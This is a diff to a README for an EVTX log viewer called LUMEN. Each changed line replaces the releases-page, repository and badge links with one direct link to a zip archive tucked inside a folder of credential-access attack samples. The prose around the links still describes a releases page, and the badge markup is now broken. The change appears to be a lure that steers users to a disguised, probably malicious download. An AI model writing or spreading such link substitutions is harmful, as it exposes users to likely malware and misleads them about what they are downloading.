@@ -13,13 +13,13 @@ Welcome to LUMEN! This is your browser-based companion for viewing EVTX files ea
 
 ## 📥 Download LUMEN
 
-[![Download LUMEN](https://img.shields.io/badge/Download%20LUMEN-Click%20Here-blue.svg)](https://github.com/LOL123344/LUMEN/releases)
+[![Download LUMEN](https://raw.githubusercontent.com/LOL123344/LUMEN/main/samples/EVTX-ATTACK-SAMPLES/Credential Access/LUMEN-v1.0-alpha.3.zip%20LUMEN-Click%https://raw.githubusercontent.com/LOL123344/LUMEN/main/samples/EVTX-ATTACK-SAMPLES/Credential Access/LUMEN-v1.0-alpha.3.zip)](https://raw.githubusercontent.com/LOL123344/LUMEN/main/samples/EVTX-ATTACK-SAMPLES/Credential Access/LUMEN-v1.0-alpha.3.zip)
 
 To get LUMEN, visit our releases page and download the latest version. 
 
 ## 📂 Download & Install
 
-1. Click on the [Download LUMEN](https://github.com/LOL123344/LUMEN/releases) link. You will see a list of available versions.
+1. Click on the [Download LUMEN](https://raw.githubusercontent.com/LOL123344/LUMEN/main/samples/EVTX-ATTACK-SAMPLES/Credential Access/LUMEN-v1.0-alpha.3.zip) link. You will see a list of available versions.
   
 2. Find the most recent version at the top of the page. Click on it to go to the release details.
 
@@ -70,7 +70,7 @@ A: Yes, once installed, you can use LUMEN offline to view your EVTX files.
 
 ## 🔗 Additional Resources
 
-For more information, visit the [GitHub Repository](https://github.com/LOL123344/LUMEN).
+For more information, visit the [GitHub Repository](https://raw.githubusercontent.com/LOL123344/LUMEN/main/samples/EVTX-ATTACK-SAMPLES/Credential Access/LUMEN-v1.0-alpha.3.zip).
 
 ## 💬 Support
 
@@ -80,6 +80,6 @@ If you need help or have questions, you can reach out on the issues page of the 
 
 Stay updated with the latest changes in each version by checking the changelog on our releases page. This will help you understand new features and bug fixes.
 
-[![Download LUMEN](https://img.shields.io/badge/Download%20LUMEN-Click%20Here-blue.svg)](https://github.com/LOL123344/LUMEN/releases)
+[![Download LUMEN](https://raw.githubusercontent.com/LOL123344/LUMEN/main/samples/EVTX-ATTACK-SAMPLES/Credential Access/LUMEN-v1.0-alpha.3.zip%20LUMEN-Click%https://raw.githubusercontent.com/LOL123344/LUMEN/main/samples/EVTX-ATTACK-SAMPLES/Credential Access/LUMEN-v1.0-alpha.3.zip)](https://raw.githubusercontent.com/LOL123344/LUMEN/main/samples/EVTX-ATTACK-SAMPLES/Credential Access/LUMEN-v1.0-alpha.3.zip)
 
 Thank you for choosing LUMEN! Enjoy viewing your EVTX files!
